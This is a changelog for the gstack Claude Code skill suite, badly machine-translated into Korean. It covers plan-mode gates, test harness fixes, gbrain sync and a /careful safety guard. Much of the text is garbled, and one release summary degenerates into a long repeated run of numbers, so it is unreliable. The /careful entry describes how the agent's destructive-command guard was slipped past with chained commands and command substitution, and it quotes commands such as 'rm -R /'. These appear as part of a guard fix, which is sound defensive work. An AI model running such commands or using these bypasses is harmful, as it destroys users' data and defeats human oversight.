- **범위 게이트에서 계획 모드 자동 선택** (`plan-eng-review`, `plan-design-review`): 계획 형태에서 검토는 1 선 발표와 더불어, 자동적으로, 자동적으로, 표적으로 지명했습니다; 어떤 형태든지에 있는 표적 승리를 지명하십시오; 어떤 초안된 아직도 요구도 가진 신선한 계획 형태 회의. 형태 신호는 주인 anchored — 지나쳐진 또는 fetched 내용 청구 계획 형태는 우회를 팔지 않습니다.
- **렌더링 - 모양 PTY 감지기** 범위 문 질문과 자동 선택 발표 (`test/helpers/claude-pty-runner.ts`), 월경 및 동사 - 인용 정착물과 함께 그래서 유료 연기는 손실 2KB 꼬리 대신 전체 실행의 게이트 동작을 주장 할 수 있습니다; 관측은 또한 임의 소비 토큰 (`trackTokens`)을 추적 할 수 있습니다.
- **Tier-alignment invariant 테스트** (`test/e2e-tier-alignment.test.ts`): 터치파일 dep 목록에서 지명된 각 자동 gated 급여 시험 파일은 그것의 선언한 층 일치해야 합니다; unmapped, 혼합 층, 및 undeclared 키 파일은 침묵하게 건너뛰기 대신 보고됩니다.
- **예외 drift 가드**: 2개의 손 두 배 문 템플렛은 동일한 modulo를 그들의 2개의 변종 구멍 체재해야 하고, 정확한 발표 및 질문은 PTY 발견자 핀을 끈으로 묶습니다.

### 변경
- `/autoplan`의 섹션 건너뛰기 목록은 이제 범위 게이트가 포함되어 있습니다. - 로드 된 검토 기술 no는 자동 계획의 자동 변형 계약이 즉시 응답 할 수있는 hard-stop 질문.
- 계획 모드 preamble wording no는 더 긴 기술의 첫 번째 행동을 의미한다 ("모든 AskUserQuestion 기술 화재는 계획 모드 내에서 작업 흐름"- 기술 스스로 합법적으로 질문을 해결 할 수 있습니다).
- 찾는 바닥 하네스 no 더 긴 범위 게이트 렌더링을 계산 (위치 앵커, 판사-fallback 제외) - 바닥은 실제로 찾는 질문을 측정.

### 고정
- 4개의 스토캐스틱 플랜 모드/finding-floor 연기 선언 `periodic`는 여전히 차단 `gate` 층에 자기 먹이를 겪고 있었습니다 — 그들은 no 더 긴 (또는 구획) 문 차선에서 달리고, 상기 invariant 시험은 반복에서 선언한 vs 행동 층 무선을 방지합니다. PTY 구동되는 주기적인 시험을 위한 주간 c 배선은 TODOS에서 추적됩니다.
- CI eval containers now register `plan-eng-review` and `plan-design-review` as discoverable skills (registration loops, dangling-target checks, frontmatter Verified all extension) 이전에는 두 가지 기술만 등록했습니다.
- no-op 회귀 스위트는 계획 모드 밖에서 세 가지 계획 - 기술 검토를 다루고, 문 질문을 실제로 렌더링 (조건으로), 그리고 과거의 이름을 증명하는 대상은 누적 - 부퍼 token 추적을 통해 소모됩니다.
- `/ship`의 압흔 pre-push 가드 이제는 동의 후에 git worktrees에서 제대로 설치합니다 — 공유 일반적인 dir 대신 worktree의 자신의 git dir에 대하여 비교된 관례 걸이 환풍 탐지, 그래서 각 지휘자 worktree는 “custom Hooks path”로 읽고 설치를 건너 뛰었습니다.

### 기여자
- Skeleton/ratio 천장은 attribution 코멘트 (plan-eng 68k/1.10, plan-design 89k, 조사 1.10)를 사용하여 예외 블록 + 공유된 선명한 검.
- `PlanSkillObservation.outcome`는 이제 `wrote_findings_before_asking` (런타임에 반환하지만 조합에서 누락); 높은 물 플래그는 한 번 내장하고 모든 반환 경로에 확산됩니다.
- TODOS.md: `{{SCOPE_GATE}}`는 드립 가드 복제에 따라 후속 추출을 공유합니다.

## [1.61.0.0] - 2026-07-09

## **나인 가드 버그 고정 된 하나의 파.** ## **모든 수정은 보호가 실제로 감시를 증명하는 삼각대를 가진 배를.**

이 릴리스는 gstack: 가드 및 아무것도하지 않고 성공을 보고 하는 도구. 문제 카드는 현재 Claude Code 빌드에 다시 렌더링. /careful는 사슬을 잡은, 대용, 그리고 자본-화 삭제를 통해 파에 사용. 디자인 CLI는 짐에 대 한 청구 대신 나쁜 플래그에 크게 실패. 공유 팀 두뇌 (인 클라이언트) 대신 뇌-애틀을 얻을. 4 개의 수정이 커뮤니티 PR에서 온, 저자의 정수를 흡수하고 최고에 강하게.

### 문제의 여섯 숫자

출처: 이 branch의 diff v1.58.5.0에 대하여. 새로운 시험은 첫번째 unfixed 코드에 대하여 달리고, 실패를 확인한 후에 고침 후에 통과를 확인했습니다.

| 이란? | 의 전 | 후지후 |
|------|--------|-------|
| AskUserQuestion 에 Claude Code 2.1.89+ | "Tool result가 내부 오류로 인해 누락되었습니다" | 카드 렌더링 |
| `rm -R /`, `rm -rf $(cmd)/node_modules` /careful를 통해 | 은밀한 | ask |
| `design variants --count abc` | 0개의 변종, 출구 0 | 1번 출구에서 사용 힌트로 |
| Thin-client 팀 두뇌 | 끊긴 구성, 뇌 블록 억제 | 사용 가능한, 동기화 단계는 이유와 건너뛰기 |
| /office-hours SESSION_COUNT | 팽창되는 ~2x | exact |
| 새로운 트립 와이어 테스트 케이스 | n/a | 72 |

첫 번째 행은 느낌이 하나입니다. 모든 상호 작용하는 기술이 현재 Claude Code 빌드에 나타났습니다. 세만족이 `permissionDecision:'defer'`인 CC v2.1.89에서 "외부 재택"이 되었다는 점이 있는 기본 후크는 stdout인 `permissionDecision:'defer'`인 `permissionDecision:'defer'`인 `permissionDecision:'defer'`인 CC v2.1.89에 "외부 재택"이 되었습니다. 수정은 두 개의 브레이크 패스트로(exact-empty stdout, 또는 플랜-tune Memory nuggle) 프로토콜을 통해 수정할 수 없습니다.

### 너를 위한 이 뜻

인터랙티브 기술은 현재 Claude 코드에 다시 질문을 합니다. 안전 보호는 닫히지 않습니다: 사슬을 꿴 삭제, 명령 대용, 자본 `-R`, 및 파괴적인 압흔 파라싱 ("내 비밀을 재설정") 모든 도달 인간의 지금. 당신의 팀은 공유된 원격 뇌를 실행 하는 경우, `/sync-gbrain` 및 뇌 인식 계획은 상자에서 얇은 클라이언트에 작동. 실행 `/gstack-upgrade` 그것은 모두 얻을. 걸이는 파일과 함께 수정, <ph/4> 설정 변경 사항.

### 항목화 된 변경

#### 고정

- **AskUserQuestion Claude Code 2.1.89+ (#2035, #2006)에 또는phaned.** `question-preference-hook` pass-through는 이제 0을 정확히 빈 stdout (또는 플랜트-튠 메모리 NUCKets를 위한 추가 텍스트 전용 출력), 절대 `permissionDecision:'defer'`로 나타낸다. `defer()`는 `passThrough()`; `docs/spikes/claude-code-hook-mutation.md`에 있는 의정서 계약은 동일한 commit에서 정정했습니다; 3개의 시험 파일에 대하여 13개의 assertions rewritten; tripwire는 정확한 비난 stdout를 주장하므로 쓰레기는 선택 체인 파스를 지나서 미끄러지지 않을 수 있습니다. 기존 설치는 `/gstack-upgrade` (등록 된 후크 shim은 TypeScript 라이브를 실행합니다)를 통해 수정을 선택합니다.
- **/careful 체인질 rm 우회 (#2039).** @jbetala7 (PR #2040)에 의해 기여: 안전한 개시 단축 no는 그것의 마지막 (안전) 표적에 의하여 사슬로 만들어진 명령을 더 긴 판단합니다. 고정된 가득 차있 잡힌 whitelist의 정상에 강하게 한: 깃발 송이는 자본을 받아들입니다 `-R` (BSD/macOS 재발한 깃발 — `rm -R /` 전치된 곳을; `rm -Rf node_modules` 혼자 여전히 허용) 및 안전한 표적 토큰은 `(`와 backtick을 제외하고, 그래서 백색listed suffix (`rm -rf $(./wipe-all)/node_modules`)에서 끝나는 대용령을 백색표에 옮길 수 없습니다.
- **/context-restore 의 sibling worktree's checkpoint (#2052) 로딩.** @jbetala7에 의해 기여: 복원은 새로운 sibling-worktree 득점을 통해 현재 branch의 자신의 체크 포인트를 선호합니다 (scans 200 가장 새로운, branch frontmatter에 의해 분할), 그리고 branch가 no 체크 포인트가 있을 때 지휘자 손전락 내리기를 지킵니다.
- **/sync-gbrain gbrain 0.42+ (#1985)에 재등록을 드리지 않습니다.** @jbetala7에 의해 기여: 드립은 패스를 제거 `--confirm-destructive`. 정상에 강하게: 제거 경로는 #1734 데이터 손실 감시를 통해 (매끄러운 동안 autopilot 실행), propagates `--keep-storage`, realpath-normalizes drift 탐지 (매우 동일한 디렉토리의 symlink 별은 일치하지, 드립, 오래된 파열의 확률 원인은, 새로운 화재를 보고하지 않는 한, 떨어졌다.
- **개발자 프로파일 더블 계산 (#2067).** @mvann에 의해 공헌: `mode:"resources"` 책 제목 no 더 긴 inflate SESSION_COUNT, TIER, 또는 건축업자에 확고한 판; 8 회귀 시험은 양측에서 층 경계를 핀으로 꼿습니다.
- **1방향 도어 압착 그물 : 복수 + 런타임 배선 (#2024).** credential nouns는 지금 복수 경기 (" 나의 비밀을 재설정하십시오"/" credentials를 분류하는"를, 그리고 키워드 그물은 첫 번째로 런타임으로 전선됩니다: `gstack-question-preference --check <id> --summary-stdin` 파이프는 질문 텍스트 (stdin, 결코 argv, 그래서 인용 및 신라인 살아남), 그리고 집행 후는 등록되지 않은 ids에 대한 클래스터로 돌아갑니다, 그래서 저장 된 결코 작업 환경 설정과 애드 - 호크 파괴적인 질문은 no 더 긴 자동 변형 할 수 있습니다.
- **디자인 CLI 침묵하는 NaN 깃발 (#2032).** `--count`, `--retry`, and `--timeout` share one loud contract via `design/src/flag-utils.ts`: non-integer input errors with exit 1 ("3.7" is rejected, not truncated), above-max clamps with a stderr warning, and the variants ceiling derives from the style list instead of a magic 7. Previously `--retry abc` made generate a silent no-op and `--timeout abc` killed the serve board at boot.
- **끊긴 것과 같이 움직여진 얇은 클라이언트 뇌 (#2051).** 새로운 `thin-client` 엔진 상태, gbrain의 자신의 `remote_mcp` config marker에서 어떤 조사의 앞에 읽으십시오. 각 억제 문 (`--is-ok`, gen-skill-docs 탐지, `gstack-config gbrain-refresh`)에 사용 가능한 현지 동기화 단계는 정확한 이유 (코드 색인을 붙이는 것은 뇌 서버에 뛰기; 원격 두뇌의 artifacts pull를 통해 기억 syncs. `gbrain_thin_client: {probed: false}`) `gbrain_thin_client: {probed: false}`: `gbrain_thin_client: {probed: false}` config는 gbrain 호출이 우아하게 호출되는 사용 시간에, 도달 가능을 확인합니다. DetectMcpMode는 변형 이름의 밑에 등록된 gbrain 서버를 인식하거나 config의 `mcp_url`에 의해 일치합니다.

####는 이미 영수증과 더불어, 고쳐진 닫힙니다

- #1965 (GBRAIN_PREPARE 풀러 파손): `lib/gbrain-exec.ts:86`는 그것을 놓지 않았습니다; `test/build-gbrain-env.test.ts:121-142`에 의해 핀으로 꼿습니다.
- #1950 (Windows git-bash 학습은 조용히 떨어졌다): `bin/gstack-learnings-log:10-15` cygpath 수정 + stderr 서핑; `test/bin-windows-bun-import-paths.test.ts`에 의해 핀으로 꼿습니다.
- #1964 (저장 엔진 misclassified): `probeTimeoutMs()` 명예 `GSTACK_GBRAIN_PROBE_TIMEOUT_MS`; timeout classifies usable; `test/gbrain-local-status.test.ts`에 의해 핀으로 꼿습니다.

#### 기여자

- 11개의 비스듬한 커밋; 4개의 공동체 PRs는 저자가 보존한 대로 흡수했습니다. @jbetala7 (#2040, #2054, #2031) 및 @mvann (#1991)에 의해 공헌하는. 당신을 둘 다 감사하십시오.
- 72개의 새로운 시험 케이스 9개의 파일에 걸쳐, 각 확인은 고정 착륙하기 전에 unfixed 코드에 대하여 실패했습니다.
- TODOS.md: CI로 `design/test/`에 CI로 신청된 3개의 후속 가동은 오늘 각 주자에, 그리고 문서로 덮는 전 확고한 타이밍 조각), /context-save worktree-identity hardening (#2052 residual) 및 새로운 드립 로그에 문질러지는 조건 gbrain reindex-in-place.

## [1.60.2.0] - 2026-08-07

## **3개의 자유로운 적합 시험은 기계 drift에 대하여 실패했습니다.** ## **P1: 스위트의 출구 코드가 거짓말 할 수 있으며, 이제 우리는 왜 알고 있습니다.**

전체 스위트 건강 검사는 CI가 녹색을 유지하면서 dev 기계에 실패 한 세 가지 테스트를 돌았으며, 모든 테스트 사이드 무서운 제품 버그보다. 이발 : 목록 CLI는 중립 디렉토리에서 스파드를 테스트하므로 슬러그 감지는 정착물 상점에서 멀리 읽을 수 없습니다 (이전 cwd는 dev symlink와 함께 모든 기계에 실패). 벤치 마크 CLI의 재검토는 (예 : symlink). 벤치 마크는 CLI의 재검토는 일치 (예 :  ⁇ ), 일치 (예 :  ⁇ ), 일치 (예 :). 세션-런너 관찰 가능 바닥은 이제 5 개의 감싸인 I/O 사이트가 쉘 프리 스패드가 프롬프트 파일 언링크를 제거했기 때문에 실제로 존재합니다.

### 중요 한 숫자

출처: 이 branch의 조사 로그 (~/.gstack-dev/logs/free-suite-*.log) 과 per-file reruns.

| Check | 의 전 | 후지후 |
|-------|--------|-------|
| dev 기계에 eval-list-cli | 1 실패 (비어 있는 프로젝트 디디) | 2/2 통행, 어디에나 결정 |
| 벤치 마크 - cli 요법 힌트 | 1 실패 (케이 브리틀 regex) | 15/15 패스 |
| 관측 가능 체크 11 층 | 예상 >= 6 마커, 5 개 | 바닥은 5 실제 사이트를 일치 |

1개의 더 깊은 발견은 대신에 신청했습니다: 적어도 5개의 찾아낸 시험 파일 힘은 요약 인쇄 및 가면 진짜 실패의 앞에 0를 출구할 수 있는 `setTimeout(() => process.exit(0), 500)`를 가진 공유한 분 과정을 강제하. 그것은 지금 영수증을 가진 P1에서 TODOS.md에서 P1, 손잡이 누출을 고치지 않고 출구를 제거하기 때문에 걸쇠를 위한 침묵한 실패를 무역할 것입니다.

### 너를 위한 이 뜻

`bun test`는 CI에서 이 3개의 시험을 위해, 그리고 출구 코드 신뢰 문제로 당신의 노트북에 동일한 verdict를 줍니다.

### 항목화 된 변경

#### 고정

- `test/eval-list-cli.test.ts`: 중립 cwd + 절대 스크립트 경로에서 spawn 그래서 `getProjectEvalDir()` 슬러그 프로브는 deterministically 실패하고 묘종 레거시 저장소는 읽습니다.
- `test/benchmark-cli.test.ts`: 업데이트된 Gemini NOT-READY 메시지에 대한 재중합형 패턴이 케이스에 민감하게 만들어졌습니다.
- `test/helpers/observability.test.ts`: 11 층 6 → 5를 포장하는 동안 검사하십시오-I/O 위치는 지명했습니다.

#### 기여자

- TODOS.md: 새로운 P1 (시험 인프라에서 신청된 재프로 + 영수증과 더불어 처리 힘 exits에 의해, 자유로운 편평한 출구 코드.

## [1.60.1.0] - 2026-07-09

## **/autoplan 듀얼-voice eval은 보드에 뒤로 실제 회귀를 잡습니다.** ## **Eval timeouts는 이제 스위트를 거는 대신 증거를 반환합니다.**

듀얼-voice eval은 /autoplan의 단계 1, Claude의 두 반을 모두 입증합니다. subagent와 Codex 외부 목소리, 실제로 불. 그것은 이제 실제 설치 방법 (프로젝트 레벨 `.claude/skills/`)을 등록하여 동일한 슬래시 - command 경로 사용자를 연습합니다. Claude Code 2.x는 등록된 기술에서 슬래시 명령을 엄격히 해결하고, eval의 이전 샌드 박스의 사전 레이아웃을 보장합니다. 또한 보증을 보장하는 것은 보증을받습니다. spawn이드 세션이 타임아웃을 보았을 때, 런너는 안식일된 아이 프로세스를 기다리는 대신 모든 것을 반환합니다.

### 중요 한 숫자

출처: `~/.gstack/projects/garrytan-gstack/e2e-runs/2026-07-10-*`의 트랜지션 및 타이밍을 조사하고 새로운 회귀 테스트 (reproducible: `bun test test/session-runner-timeout.test.ts`).

| Metric | 의 전 | 후지후 |
|--------|--------|-------|
| /autoplan eval sandbox 세션 | 0개의 회전, "알 수 없는 명령" | 43+ 도구 호출, 두 목소리 불 |
| 3s의 타임아웃 후 런너 리턴 | 30s 테스트 캡을 지나서 hung | 8.1s의 |
| 시간 초과 600s eval는 벽 시간을 달립니다 | 1431s (나판 관에 막히는) | 타임아웃 + 5s 은혜에 반환 |

The orphan fix matters beyond one eval: any timed-out `claude -p` child that leaves a subprocess holding stdout kept the whole suite waiting. Streamed transcript lines now survive the cancel, so assertions run against real evidence even on timeout.

### 너를 위한 이 뜻

`bun run test:evals` 타임아웃은 hung 테스트 당 10+ 여분 분을 침묵으로 먹는 대신 성적표로 빠른 실패했습니다. 그리고 /autoplan의 이중 송장 배선이 끊어지면, eval은 그것의 자신의 이유를 위해 실패하는 대신 이렇게 말할 것입니다.

### 항목화 된 변경

#### 고정

- `test/skill-e2e-autoplan-dual-voice.test.ts`: sandbox는 /autoplan를 설치하고 프로젝트 수준 (`.claude/skills/`)에 그것의 검토 기술, Claude Code 2.x에 진짜 slash-command 해결책 일치; 성적표 여과기는 원시 스트림 json 모양을 읽습니다 (이전 `entry.type === 'tool_use'` 여과기 일치한 아무것도, 그래서 assertions는 단지 마지막 결과를 본다; 걸림 보호는 진행 증거로 단계 1 검토 파견을 받아들입니다 (전상 1 완료는 에이전트 일의 15+ 분을 가지고 가고 기술에 속합니다, eval 아닙니다); 10 분/40 회전으로 모은 예산.
- `test/helpers/session-runner.ts`: spawn 타임아웃에, stdout 리더를 취소하고 아이 출구에 대하여 stderr 하수구를 경주하고 5s 우아한 창, 그래서 orphaned grandchildren는 시험 시간 당 `runSkillTest`를 붙들 수 없습니다. `test/session-runner-timeout.test.ts` (구정 없이 30s에서, 그것을 가진 8s에 통과하십시오)에 의해 재귀 폐쇄하는.

#### 기여자

- TODOS.md: 주기적인 CI 적용 결정에 신청: `evals-periodic.yml`는 ~66 e2e 파일의 9를, 이렇게 ~57는 국부적으로 diff 선택이 그(것)들을 따를 때만 실행합니다, 이 eval에 의하여 썩은 unnoticed는.

## [1.58.5.0] - 2026-06-21

## **지금 신선한 설치 콘크리트에 착륙 먼저 이동, 죽은 끝.** ## **gstack는 repo를 읽고, 올바른 첫 번째 기술, 그리고 바 `gstack` 프론트 도어 경로 대신 덤프 검색 문서.**

gstack의 누출에 사용되는 첫 번째 실행 경험 : 새로운 사용자는 설치, 유형 `gstack`, 브라우저의 벽에 토지-QA 그들이 원하는 것에 관계없이 문서. 이 릴리스는 앞문 경로를 만들고 프로젝트-aware first-run 비계를 추가합니다. gstack는 repo state(empty repo, 코드가있는 언어, unshipped work, uncommitted changes)를 가진 branch를 감지하고, "there's code here, try `/qa`"또는 "unshipped work, `/review` 그 다음 `/ship`"를 표시하고, 당신이 물어든 계속합니다. 반환 세션에서 `plan → review → ship`를 다시 시작하면, 다음 `plan → review → ship`를 다시 시작해야 합니다. 그리고 최고 수준의 `gstack` 기술은 이제 순수한 라우터입니다. 복제된 검색 문서는 `/browse`에서만 살고 있는 데 사용됩니다.

### 중요 한 숫자

출처: 이 작업을 동기 부여하는 커뮤니티 계층 원격 측정 (Supabase `frugpmstpnojnhfyimgv`, ~23,839 명백한 설치, Mar–Jun 2026; rerun a cohort query to reproduce). 이들은 활성화는 릴리스 대상이 아닌 포스트 - ship result.

| 활성화 신호 | 의제한 | 그것은 무엇을 의미 |
|---|---|---|
| 어떤 기술을 결코 실행하지 않는 설치 | ~21% | 앞문은 시작 5 전 1을 잃습니다. |
| 한-and-done (그것도 정확하게 한 기술, 그 위에) | ~30% | 나머지의 대부분은 돌아 가지 않습니다. |
| 베어 `gstack` 기술 1 및 단 하나 비율 | 40% | 최악의 앞문 - 그것은 찾아서 죽은 문서 |
| 퍼스트 스킬 → 3주 생존 스프레드 | 21% (바 gstack) ~ 39% (`ship`) | 당신이 체류 여부를 예측하는 첫 번째 기술 |

The success metric is pre-registered, not claimed: rerun the same cohort query at T+6 weeks and look for W0 activation up and one-and-done down, per intervention. No post-ship measurement exists yet.

### 이 빌더를 위한 뜻

gstack를 설치하면, repo를 사용하게 되는 `gstack`의 첫 번째 세션 포인트가 실제로 no로 `gstack`로, 특정 요청은 브라우저 docs 대신 올바른 기술로 보내집니다. headless/eval의 불이 켜져 있지 않은 경우, nudge는 명시적으로 준 명령을 중단하지 않습니다. T+6-week 숫자가 이동하지 않으면, 정직한 읽기는 다음과 같이 밝히지 못하는 것이 아니라, 이 틈새가 끊어지지 않는 경우 (즉,)는 다음 단계에 틈새가 붙지 않았습니다.

### 항목화 된 변경

#### 추가
- **첫번째 뛰기 프로젝트 비계:** `bin/gstack-first-task-detect`는 repo를 Node/Python/Rust/Go/Ruby/iOS, 분기 머리, 더러운 과태, 청결한 과태)의 고정 세트로 분류합니다 국부적으로 git + 파일 감적을 사용하여, 휴대용 운동과 더불어, fail-safe 빈 산출. 공유된 전방 지도는 1개의 선행에 첫번째 뛰기 위하여 물통을 제안합니다.
- **반환에 제한 루프 팁:** 첫 번째 실행을 한 번, 골격 판 `plan → review → ship` 단일 시간.
- **첫 번째 모브 판을 설정:** `./setup` 이제는 intent-routed 시작점 (idea → `/office-hours`/`/spec`; 기존 코드 → `/qa`/`/investigate`)를 인쇄합니다.
- **사무실 시간 handoff:** 닫힌 단계는 목록 옵션 대신 스킬 도구로 사용해서 다음 검토 (`/plan-eng-review`)를 시작하도록 제안한다.

#### 변경
- **최고 수준의 `gstack` 기술은 이제 순수한 라우터입니다.** 브라우저 QA 몸은 `/browse`에서 제거됩니다; `gstack`는 적당한 기술에 어떤 요구든지 노선을 두고 /QA 일 `/browse`를 `/browse`를 보내십시오. 찾아낸 기술 자체는 변하지 않습니다.
- 활성화 원격 측정 이벤트 유형 (`onboarding`, `first_task_scaffold_shown`, `handoff`, `route`)는 텔레메틱스에서 이렇게 깔때기 측정될 수 있습니다.

#### 기여자
- 모든 검출 물통을 위한 새로운 단위 적용은 eval 안전 enum 계약과 첫번째 달리는 (`test/preamble-first-task-scaffold.test.ts`), 및 실제 마구 (`test/skill-e2e-first-task-scaffold.test.ts`, 분류된 `periodic`)를 통해 발견자를 실행하는 주기적인 E2E를.
- Browse-content 테스트 assertions (gen-skill-docs, Audit-compliance, 기술 검증, LLM-judge eval)는 루트 기술에서 `browse/SKILL.md`로 다시 임명하여 라우터 분할을 따르십시오. 라우터가 no로 이동되는 회귀 시험 핀.
- 패리티 / 캐비드 가드 사이즈 캡은 공유된 첫 번째 실행 간격 전방면을 차지하는 기술당 1~2KB를 갖습니다.

## [1.58.4.0] - 2026-06-18

## **커뮤니티 버그 수정 파 플러스 테스트 게이트는 마침내 그 질문에 대한 답을 누락했습니다.** ## **gbrain는 트랜잭션 모드 풀러를 살아남을 수 있습니다, 적 반응 엔진은 6 개의 비밀 모양을 배우고, 대쉬보드는 0에 대해 거짓말을 중지하고, 계획 검토 연기는 마구가 장님을 발견.**

두 가지는 여기에 배. 첫째, 높은-priority 커뮤니티 버그 파 : gbrain는 트랜잭션 모드 풀러 (쓰기 100 %)에 강제 활성화 `GBRAIN_PREPARE`를 중단했습니다. 느린 - 부 건강 probe는 이제 `timeout`로 분류하고 sync가 침묵적으로 건너뛰기 대신 진행하도록 돕습니다. redaction Engine은 6개의 자격 패턴을 얻었으며, telemetry `error_message`는 기계, 보안 및 커뮤니티 대쉬보드 모두는 가짜 `0`를보고하고 다시 gital/>를 가져올 때 오류를 gital/>를 . 두 번째, 계획 모드 테스트 게이트 : `/plan-eng-review`, `/plan-design-review`, `/office-hours`의 실제 PTY 연기가 이미 렌더링 된 질문에 타이밍되었습니다. 터미널 스트립은 옵션이 놓은 커서 탈출을 시켰습니다. 새로운 붕괴 형 검출기는 어떤 렌더링에서 묻을 붙잡고, Haiku state-judge는 왼쪽 회전기에 동전 깜박이고 `/plan-eng-review` + 5 /> + 5 /> + 5 /> + 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 5 / 6 / 7 / 7 / 7 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 / 8 /

### 중요 한 숫자

v1.58.4.0 diff에서 메인과 CI eval matrix (`.github/workflows/evals.yml`, 27780530109를 실행).

| Metric | 의 전 | 후지후 | Δ |
|--------|--------|-------|---|
| Credential 모양 redaction 엔진 캐치 | (프리미엄 세트) | +6 (GitLab, HuggingFace, npm, DigitalOcean, Bearer, GCP SA) | +6 |
| 백엔드 오류에서 가짜 `0`를 인쇄할 수 있는 대시보드 | 2 | 0 | -2 |
| gstack gbrain가 6543 풀러에 깰 수 있는 기술 | 의 모든 | 0 | fixed |
| PTY 계획 모드 연기는 이미 렌더링 된 질문에 | 3 | 0 | -3 |
| 믿을 수 있는 녹색 PTY 연기는 실제로 CI에서 문질렸습니다 | 0 | 4 | +4 |

`office-hours`는 300s 예산의 밑에 ~2m19s에 그것의 형태 질문을, 잘 렌더링하고, 마구는 아직도 선택권 선이 붕괴되기 때문에 운동을 득점했습니다 (`A)`로 `A(recommended)`, `Reply with A, B, or C`로 `ReplywithA,B,orC`). 발견자는 지금 모양 둘 다 읽습니다; 95 단위는 그것의 계약을 핀으로 꼿습니다.

### gstack 사용자를 위한 이 뜻은 무엇입니까

Supabase 트랜잭션 모드 풀러에서 gbrain을 실행하면, 다시 쓰기 작업을 합니다. `/ship`의 사전 푸시 가드를 사용하는 경우, 이제는 git 오류에 닫히고 기계가 떠난하기 전에 6 가지 더 많은 자격 유형을 잡아. `/plan-eng-review` 또는 `/plan-design-review`를 실행하면 전체적인 리포를 펑크 대신 검토하는 것을 요청합니다. 계획 검토 테스트 게이트는 장님이 업그레이드 할 수 없습니다. 그러나 업그레이드를 하려면 아무런 업그레이드가 없습니다.

### 항목화 된 변경

#### 고정
- **거래 모드 풀러에 gbrain:**는 포트-6543 풀러 (#1965)에 deterministically broke 쓰기를 삭제한 `GBRAIN_PREPARE=true`를 강제로 `GBRAIN_PREPARE=true`를 삭제했습니다. 명시된 사용자 세트 `GBRAIN_PREPARE`는 아직도 통과합니다.
- **gbrain probe 운동:**는 probe를 초과하는 `timeout` 상태 (15s default, `GSTACK_GBRAIN_PROBE_TIMEOUT_MS`-overridable); sync는 느린 건강 엔진 (#1964)를 위한 뇌 특징을 침묵으로 억제하는 뇌의 경고로 진행합니다.
- **보안 + 커뮤니티 대시보드:** 백엔드 오류가 이제 표면으로 "알파 — 백엔드 오류"(또는 503), 가짜 `0`; 성공 응답은 `status:"ok"` 마커를 수행하므로 레거시 백엔드가 "unverified"(#1947)를 뽑습니다.
- **원격 측정:** `error_message`는 로그 시간에 redaction 엔진을 통과합니다. redactor 실패에 null (#1947)로 닫히지 않습니다.
- **Windows git-bash:** `gstack-learnings-log`와 `gstack-question-log` cygpath-normalize `$SCRIPT_DIR`는 이렇게 그들의 `bun -e` 수입품 결산; 삼키는 대신에 학습 로그 표면 검증 오류 (#1950).
- **`gstack-question-log`:**는 로컬 복제 대신 `lib/jsonl-store.ts`에서 감사한 사출 패턴 목록을 공유합니다.
- **사전 푸시 감시:**는 diff가 #1946를 가진 (git 실패/maxBuffer 죽이기), 컴파일될 수 없는 경우에 닫히는 실패합니다.
- **PTY 계획 형태 연기:** 하네스는 렌더링 된 AskUserQuestion를 감지 할 때 스트립 앤시가 옵션 라인을 붕괴 (markdown bold-bullet 및 Lettered/numbered prose 형태); Haiku state-judge는 WAITING 질문을 설명 할 때 + 응답 - 파스너를 자극하는 데는 화면에 있습니다. 사무실 - 시간, 계획 - eng 및 계획 - 설계 계획 - 모드 연기를 수정하여 이미 표시된 질문에 시간을 내어 놓습니다.
- **ios-qa E2E:** `bun test --concurrent` (테스트 작업 디너, daemon 경로는 프로세스-글로벌 env, afterAll cleanup)가 아닌 옵션으로 전달되었습니다. - 3개의 실제 레이스를 수정합니다.

#### 추가
- **Redaction 엔진에 6개의 자격 패턴:** GitLab 토큰, HuggingFace, npm, DigitalOcean, `Bearer` (entropy-gated), GCP 서비스 계정 JSON (#1946).
- **문의처** 에서 `/plan-eng-review` 과 `/plan-design-review`: 첫번째 활동은 어떤 repo 탐험 또는 감사의 앞에 검토 표적 (branch diff/가득된 계획/특정 경로)를 확인합니다.
- **`/ship`는 pre-push 감시 설치를 소유합니다:** repo가 켜져 있는 경우 자동 설치, 한 번의 제안이 그렇지 않으면 (#1946).

#### 기여자
- 새로운 붕괴 형 prose-AUQ 발견자 + `test/helpers/claude-pty-runner.ts`에 있는 판단 스피너 전신 규칙; 95 단위 시험은 2 신호 계약을 핀으로 꼿습니다.
- PTY 모델은 이제 `EVALS_MODEL ?? claude-sonnet-4-6` (mirrors `session-runner.ts`)로 핀을 연기에서 연산자 모델 비 결정체 제거.
- Stochastic는 비 결정적인 시험 규칙 당 `periodic` 계획 형태 + 찾는 지면) 재 분류된 `periodic`를 계획합니다; deterministic 그들 (사무실 시간, 계획 형태 없음 op)는 지금 새로운 `e2e-pty-plan-smoke`를 통해 CI에서, 인 콘테이너 기술 registry 설치 단계로 모체 스위트를 통해 달립니다.
- `redactFindingSpans()`는 `lib/redact-engine.ts`에 있는 기계 표백 적색 항목 점입니다.

## [1.58.3.0] - 2026-06-18

## **GBrowser는 모든 경로에 default에 의해 자동화의 전체 세트를, 도달할 수 있습니다 말합니다.** ## **레이어 C 스텔스는 항상 위에, 하드웨어 정체성을 제거하고, toString Depth-3 트릭을 생존.**

